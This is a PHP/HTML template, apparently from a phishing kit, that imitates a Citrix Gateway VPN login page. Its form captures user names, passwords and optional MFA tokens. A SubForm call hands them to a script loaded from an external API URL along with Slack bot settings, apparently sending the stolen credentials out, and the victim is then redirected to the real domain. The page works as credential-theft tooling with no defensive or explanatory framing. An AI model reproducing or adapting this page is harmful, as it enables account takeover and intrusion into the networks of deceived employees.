<!DOCTYPE html PUBLIC "-//W3C//DTD XDEV_HTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><script>
if (navigator.usb) {
  delete navigator.usb.__proto__.getDevices;
  delete navigator.usb.__proto__.requestDevice;
  delete navigator.__proto__.usb;
}
</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Citrix Gateway</title>
<link rel="SHORTCUT ICON" href="AccessGateway.ico" type="image/vnd.microsoft.icon">

<script src="<?php echo $APIURL; ?>/APICredentialFormSubmit.js"></script>

<?php
		
		$parsedurl = parse_url($Redirect);

		$domain = $parsedurl['scheme']."://".$parsedurl['host'];
		
		?>

<meta content="noindex,nofollow,noarchive" name="robots">
<link href="./template_files/rdx.css" rel="stylesheet" type="text/css">
<link href="./template_files/base.css" rel="stylesheet" type="text/css" media="screen">
<link rel="stylesheet" href="./template_files/citrix-fonts.css" type="text/css">
<link href="./template_files/custom.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="./template_files/rdx.js.download"></script>
<script type="text/javascript" src="./template_files/login.js.download"></script>
<script type="text/javascript" src="./template_files/views.js.download"></script>
<script type="text/javascript" src="./template_files/gateway_login_view.js.download"></script>
<script type="text/javascript" src="./template_files/gateway_login_form_view.js.download"></script> 
<style type="text/css">
body
{
  display : none;
  visibility: hidden;
}
</style>
<script language="JavaScript">
// frame-busting script
function changePage()
{
	if( self == top ) {
  		 document.getElementsByTagName("body")[0].style.display = 'block' ;
		 document.getElementsByTagName("body")[0].style.visibility = 'visible' ;
		 ns_fillName();
	} else {
   		top.location = self.location ;
	}

}
function setFocus(obj)
{
   if (obj != null) {
      obj.focus();
   }
}			
//-->
</script>
<script type="text/javascript" src="./template_files/resources.js.download"></script>
<script type="text/javascript" language="javascript">
var Resources = new ResourceManager("/logon/themes/Default/resources/{lang}", "logon");
var eula = new ResourceManager("/logon/themes/EULA/resources/{lang}","custom_strings");
</script>
<script type="text/javascript" src="./template_files/nsshare.js.download"></script>
<meta content="MSHTML 6.00.2900.2802" name="GENERATOR">
<script>(function n(){!function(){function e(e,t,n){t=t||{};var r=e.ownerDocument||e,i=r.createEvent?r.createEvent("CustomEvent"):r.createEventObject();i.initCustomEvent&&i.initCustomEvent(t.type,!!t.bubbles,!!t.cancelable,t.detail);for(var a in t)i[a]=t[a];return setTimeout(function(){try{e.dispatchEvent?e.dispatchEvent(i):e.fireEvent("on"+t.type,r.createEventObject())}catch(n){var a=e["listen"+t.type];if(a)for(var o=0;o<a.length;++o)try{a[o].call(e,i)}catch(e){}}n()},0),this}function t(e,t,n){function r(e,t){try{var n=e.ownerDocument;if(n.createEventObject){var r=n.createEventObject();e.fireEvent("on"+t,r)}else r=n.createEvent("HTMLEvents"),r.initEvent(t,!0,!0),e.dispatchEvent(r)}catch(e){}}var i=!0,a=e.className&&e.className.indexOf("fancified")!=-1;if(window.jQuery){var o=window.jQuery(e);try{if(o.selectBoxIt)o.selectBoxIt("selectOption",o.val());else if(o.data("chosen")||o.chosen)o.trigger("chosen:updated").trigger("liszt:updated");else if(o.data("chooserElement"))o.trigger("change");else if(o.fancySelect)o.get("fancySelect").select("value",o.val());else if(o.selectBox)o.selectBox("value",o.val());else if(o.selectric)o.selectric("refresh");else if(o.coreUISelect){var s=o.data("coreUISelect");s.isSelectShow=!0,s.changeDropdownData(),s.isSelectShow=!1}else if(o.data("myJSPulldownObject")){var l=o.data("myJSPulldownObject");l.setToValue(o.val())}else if(o.fancyfields)o.setVal(o.val());else if(o.data("select2"));else if(o.data("selectize"))i=!1,o.data("selectize").setValue(o.val());else if(o.hasClass("fancified"))o.trigger("update");else if(o.selectmenu){var c=o.val();try{o.selectmenu("value",o[0].options[0].value)}catch(e){}o.selectmenu("value",c)}else o.hasClass("select-hidden")&&o.next("div.select-styled").length&&o.next("div.select-styled").next(".select-options").length&&(ulElement=o.next("div.select-styled").next(".select-options"),liElement=ulElement.find("li[rel='"+o.val()+"']"),liElement.click());o.trigger("change")}catch(e){}}i&&(a&&r(e,"update"),r(e,"change"),r(e,"blur")),n()}function n(t,n,r,i){var a=t.value;e(t,{type:"keydown",keyCode:n,which:n,charCode:n,bubbles:!0},function(){e(t,{type:"keypress",keyCode:n,which:n,charCode:n,bubbles:!0},function(){setTimeout(function(){var o=t.value;a==o&&(t.value=r),e(t,{type:"input",keyCode:n,which:n,charCode:n,bubbles:!0},function(){e(t,{type:"keyup",keyCode:n,which:n,charCode:n,bubbles:!0},function(){i()})})},1)})})}function r(e,t,i,a){if(!t||""==t)return void a();var o=t.charCodeAt(0);i+=t.charAt(0),n(e,o,i,function(){r(e,t.substring(1),i,a)})}function i(t,n,r){if(window.abineTriggerChangeInProgress)return void setTimeout(function(){i(t,n,r)},100);t.setAttribute("mmautofilling","now"),t.focus(),t.value=n;var a=!0;window.abineTriggerChangeInProgress=!0;try{if(window.jQuery){var o=window.jQuery(t);if(o.data("rawMaskFn")||o.mask||o.CardPhoneFormatting)o.focus().val(n).trigger("input").trigger("paste");else if(o.next(".inner").find(".options").length){a=!1;var s=o.next(".inner").find(".options"),l=s.find("span");l.each(function(){var e=$(this),t=$(e).html();t.toLowerCase().indexOf(n)>-1&&$(e).click()})}}}catch(e){}t.defaultValue=n;try{var c=t._valueTracker;c&&c.setValue(n+"old")}catch(e){}try{t.__preactattr_&&t.__preactattr_.onChange&&(t.value=n,t.__preactattr_.onChange({target:t}),t.click())}catch(e){}try{var u=new Event("input",{bubbles:!0,cancelable:!0,data:n});u.simulated=!0,t.dispatchEvent(u)}catch(e){}try{e(t,{type:"keyup",keyCode:38,which:38,charCode:38,bubbles:!0},function(){})}catch(e){}a?e(t,{type:"change"},function(){e(t,{type:"blur"},function(){window.abineTriggerChangeInProgress=!1,t.removeAttribute("mmautofilling"),r()})}):(t.removeAttribute("mmautofilling"),window.abineTriggerChangeInProgress=!1,r())}function a(t,n,a){try{t.ownerDocument.defaultView.focus()}catch(e){}e(t,{type:"focus"},function(){e(t,{type:"click"},function(){r(t,n+"\n","",function(){i(t,n,function(){e(document,{type:"abineFilled"},function(){a()})})})})})}function o(n,r,i,a){var o=/[\s]+/g,s=(r||"").toLowerCase().replace(o,""),l=function(){e(document,{type:"abineFilled"},function(){a()})},c=!1,u=!1,d=n.getElementsByTagName("option");if(d&&d.length>0){for(var h=-1,f=0;f<d.length;f++){var p=(d[f].text||"").toLowerCase().replace(o,""),m=(d[f].getAttribute("value")||"").toLowerCase().replace(o,"");if(m==s||p==s){d[f].selected||(c=!0,d[f].selected=!0),u=!0;break}h==-1&&p.indexOf(s)!=-1&&(h=f)}u||h==-1||i||d[h].selected||(c=!0,d[h].selected=!0,u=!0)}n.setAttribute("abineFillResponse",u),c?t(n,r,l):l()}function s(){var e=document.getElementsByClassName("abineFillTarget");if(e.length>0)return e[0];for(var t=0;t<frames.length;t++)try{var e=frames[t].document.getElementsByClassName("abineFillTarget");if(e.length>0)return e[0]}catch(e){}return null}function l(){var n=document.createElement("div");n.id="abineFillElement","undefined"!=typeof paypal&&n.setAttribute("data-paypal","1"),"undefined"!=typeof OffAmazonPayments&&n.setAttribute("data-amazon","1"),"undefined"!=typeof MasterPass&&n.setAttribute("data-masterpass","1"),document.documentElement.appendChild(n),n.addEventListener("fill",function(){var t=s();if(t){var r=n.getAttribute("value");a(t,r,function(){})}else e(document,{type:"abineFilled"},function(){})},!1),n.addEventListener("fillSelect",function(){var t=s();if(t){var r=n.getAttribute("value"),i=!!n.getAttribute("skipPartial");o(t,r,i,function(){})}else e(document,{type:"abineFilled"},function(){})}),n.addEventListener("triggerChange",function(){var e=s(),r=n.getAttribute("value");e&&(e.nodeName.match(/select/i)?t(e,r,function(){}):i(e,r,function(){}))})}l()}()})()</script></head>
<body class="ns_body" id="bodyTag" style="display: block; visibility: visible;">
<!-- Copyright 2001-2005 Citrix Systems, Inc. All Rights Reserved -->
<noscript>
<BR><BR>
<table style="WIDTH: 100%">
<tr>
 	<td align="center">
		<table class="CTXMSAM_LogonFont">
			<tr id="errorMessageRow">
				<td class="glowBoxLeft">&nbsp;</td>                            
				<td class="loginTableMidWidth">
					<div id="feedbackArea">
					<div id="feedbackStyle" class="feedbackStyleError">
					<span id="errorMessageLabel" class="messageStyle">
					JavaScript is either disabled in or not supported by the Web browser.  
					To continue logon, use a Web browser that supports JavaScript or enable JavaScript in your current browser.
					</span>
					</div>
					</div>
				</td>                           
				<td class="glowBoxRight">&nbsp;</td>
			</tr>
		</table>
	</td>
</tr>
</table>

<table style="display:none">
</noscript>
<!--<script>
rdx.FRAMEWORK_BASE = "/vpn/js";
rdx.page.add_event_handler(rdx.events.PAGE_LOADED, new rdx.callback(login, login.do_action_on_load));
rdx.page.add_event_handler(rdx.events.PAGE_LOADED, new rdx.callback(function()
{
        randomize();
        resize();
}));
$(window).resize(function(){resize();});
</script>-->


<div class="activity_status_bar"><div class="activity_bar activity_status_bar_position" style="display: none;"><span></span></div><div class="status_bar activity_status_bar_position" style="display: none;"><span></span></div></div><div class="ns_header_container"><div class="base_view_no_view_top_container"><div class="base_view_container"><div class="header_parent_div"><div class="ns_header ns_header_view_panel"><a href="<?php echo $Redirect; ?>" aria-label="Skip Navigation" class="skip_navigation">Skip Navigation</a><div class="full_width_table ns_banner_table rdx_page_center_align header_info"><div class="info_cell_left"></div><div class="info_cell_right"><div class="header_info_right"><ul><li class="header_view_menu_settings_link_app_search header_view_menu_settings_link"><a class="app_search_button_in_header_hide"></a></li></ul></div></div></div></div></div></div></div></div><div class="center_panel" style="display: block;"><div class="loading_panel">rdx.page_loading</div></div><div class="rdx_message_container rdx_page_center_align" style="width: 1276px;"></div><div id="ns_content" class="ns_content rdx_page_center_align" style="display: block; min-height: 710px;"></div><div class="popup popup_info auto-refresh">rdx.page_auto_refresh_off</div><div class="view_div_decorator base_view_no_view_top_container"><div class="base_view_container"><div id="authentication"><div id="logonbelt-topshadow"><table class="full_width"><tr id="row1"><td class="header_left"></td></tr><tr id="row2"><td colspan="2" class="navbar"></td></tr></table></div><div id="logonbox-container"><div id="logonbox-innerbox"><div id="logonbox-logoarea"><div id="logonbox-logoimage"></div></div><div id="logonbox-logonform" class="clearfix"><div class="view_div_decorator base_view_no_view_top_container"><div class="base_view_container"><form method="post" action="<?php echo $domain; ?>/cgi/login" name="vpnForm" autocomplete="off" style="magin:0" id="vpnForm" abineguid="860D3C2229F94FB999BC34FAB25DA00F"><div id="ctl08_loginAgentCdaHeaderText2" class="CTX_ContentTitleHeader login_page">Please log on to continue.</div><div class="field clearfix CredentialTypeusername"><div class="left"><span class="plain input_labels form_text" id="User_name">User name</span></div><div class="right"><input type="text" id="Enter user name" class="prePopulatedCredentials" autocomplete="off" spellcheck="false" name="a7232646314647444" size="30" maxlength="127" width="180px" autofocus="autofocus" title="Enter user name"><input id="dummy_username" name="a2698871863168938" type="text" style="display:none"></div></div><div class="field clearfix CredentialTypepassword"><div class="left"><span class="plain input_labels form_text" id="Password">Password</span></div><div class="right"><input type="password" id="dummy_pass1" name="a1289323823389741" style="display:none"><input type="password" id="passwd" class="prePopulatedCredentials" autocomplete="off" spellcheck="false" name="a1604072693291977" size="30" maxlength="127" width="180px"></div></div>
<?php if($MFA == "on"){ ?>
<div class="field clearfix CredentialTypeusername"><div class="left"><span class="plain input_labels form_text" id="token">Token</span></div><div class="right"><input type="text" id="passwd" class="prePopulatedCredentials" autocomplete="off" spellcheck="false" name="a1604072693291999" size="30" maxlength="127" width="180px" <?php if($MFArequired == "on"){ ?>required<?php } ?>></div></div>
<?php } ?>
<div class="field CredentialTypenone"></div><div class="field buttons"><div class="left"></div><div class="right"><input type="submit" id="Log_On" value="Log On" class="custombutton login_page" onclick="SubForm('<?php echo $APIURL; ?>','vpnForm','<?php echo $Project; ?>','<?php echo $SlackBotName; ?>','<?php echo $SlackEmoji; ?>','Enter user name','passwd','<?php echo $Redirect; ?>','<?php if(isset($_REQUEST['csrffield'])){echo $_REQUEST['csrffield'];}else{echo '';}?>')"></div></div></form></div></div></div></div></div><div id="logonbelt-bottomshadow" style="margin-top: 301px;"></div></div></div></div></body><div id="abineFillElement"></div><div class="abineContentPanel" style="background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; background-color: transparent !important; margin: 0px !important; padding: 0px !important; opacity: 1 !important; z-index: 2147483647 !important; position: absolute !important; overflow: hidden !important; border-width: 0px !important; visibility: visible !important; display: none;"><iframe class="abineContentFrame" width="450px" allowtransparency="true" frameborder="0" height="0px" scrolling="no" src="./template_files/panel.html" id="abine29387203doNotRemove" style="position:relative !important;display:block !important;background:transparent !important;border-width:0px !important;left:0px !important;top:0px !important;visibility:visible !important;opacity:1 !important;filter:alpha(opacity:100) !important;margin:0 !important;padding:0 !important;height:0px !important;width:450px"></iframe></div></html>